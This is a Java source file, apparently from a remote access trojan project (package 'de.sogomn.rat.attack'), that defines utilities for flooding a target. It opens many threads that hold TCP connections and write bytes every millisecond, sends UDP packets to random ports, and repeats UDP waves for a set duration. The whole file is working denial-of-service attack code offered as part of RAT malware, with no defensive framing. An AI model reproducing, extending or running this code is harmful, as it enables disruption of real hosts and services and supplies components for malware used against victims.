package de.sogomn.rat.attack;

import java.io.IOException;
import java.io.OutputStream;
import java.net.BindException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;

public final class AttackUtils {
	
	private static final int TCP_INTERVAL = 1;
	private static final int UDP_INTERVAL = 150;
	
	private AttackUtils() {
		//...
	}
	
	public static void launchTcpWave(final String address, final int port, final int threads) {
		final Runnable runnable = () -> {
			try {
				final Socket socket = new Socket(address, port);
				final OutputStream out = socket.getOutputStream();
				
				while (socket.isConnected() && !socket.isClosed()) {
					final byte[] data = new byte[1];
					
					out.write(data);
					out.flush();
					
					Thread.sleep(TCP_INTERVAL);
				}
				
				out.close();
				socket.close();
			} catch (final InterruptedException ex) {
				ex.printStackTrace();
			} catch (final IOException ex) {
				System.err.println(ex.getMessage());
			}
		};
		
		for (int i = 0; i < threads; i++) {
			final Thread thread = new Thread(runnable);
			
			thread.start();
		}
	}
	
	public static void launchUdpWave(final String address, final int threads) {
		final Runnable runnable = () -> {
			/*65535 = Max port*/
			final int port = (int)(Math.random() * 65534) + 1;
			final InetSocketAddress socketAddress = new InetSocketAddress(address, port);
			
			try {
				final DatagramSocket socket = new DatagramSocket();
				final byte[] data = {1};
				final DatagramPacket packet = new DatagramPacket(data, data.length, socketAddress);
				
				socket.send(packet);
				socket.close();
			} catch (final BindException ex) {
				System.err.println(ex.getMessage());
			} catch (final IOException ex) {
				ex.printStackTrace();
			}
		};
		
		for (int i = 0; i < threads; i++) {
			final Thread thread = new Thread(runnable);
			
			thread.start();
		}
	}
	
	public static void launchUdpFlood(final String address, final long milliseconds) {
		final long time = System.currentTimeMillis();
		
		while (System.currentTimeMillis() - time < milliseconds) {
			launchUdpWave(address, 1);
			
			try {
				Thread.sleep(UDP_INTERVAL);
			} catch (final InterruptedException ex) {
				ex.printStackTrace();
			}
		}
	}
	
}
